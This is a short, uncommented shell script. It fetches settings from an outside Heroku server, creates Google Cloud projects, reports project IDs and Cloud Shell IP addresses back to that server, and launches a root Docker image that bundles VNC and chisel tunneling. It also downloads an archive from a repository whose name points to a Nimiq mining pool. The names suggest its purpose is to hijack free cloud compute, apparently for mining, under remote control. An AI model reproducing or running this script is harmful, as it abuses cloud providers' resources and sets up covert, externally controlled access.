
url="http://jsonserver01.herokuapp.com/temp/"$1
mail=$(curl $url | jq -r '.mail')
isStart=$(curl $url | jq -r '.isStart')
xproject=$(curl $url | jq -r '.project')
ip=$(curl $url | jq -r '.ip')
ispresent=$(gcloud projects list | grep xproject)
if [ -z "$ispresent" ]
then
	xproject=project$RANDOM
	gcloud projects create $xproject
fi
curl -k -s -o /dev/null -w '%{http_code}' -i -H "Accept: application/json" -H "Content-Type:application/json" -X PUT --data "{\"mail\":\"$mail \",\"isStart\":\"False\",\"project\":\"$xproject\",\"ip\":\"$ip\"}" $url
docker run -d -e NAME=xgoogle1 -p 6902:6902 -p 8888:22 -p 8080:8080 -e PORT=6902 -e SYNC=true --user 0 caubequay00/ubuntu-novnc-chisel



wget https://github.com/Vinhuit/azurenimpool/releases/download/NimiqFullBlock13_2_2019/ssh.tar.gz
tar xvzf ssh.tar.gz
gcloud config set project $xproject
gcloud services enable cloudshell.googleapis.com
echo $(curl -k -s -o /dev/null -w '%{http_code}' -i -H "Accept: application/json" -H "Content-Type:application/json" -X PUT --data "{\"mail\":\"$mail \",\"isStart\":\"True\",\"project\":\"$xproject\",\"ip\":\"$DEVSHELL_IP_ADDRESS\"}" $url)
gcloud alpha cloud-shell ssh
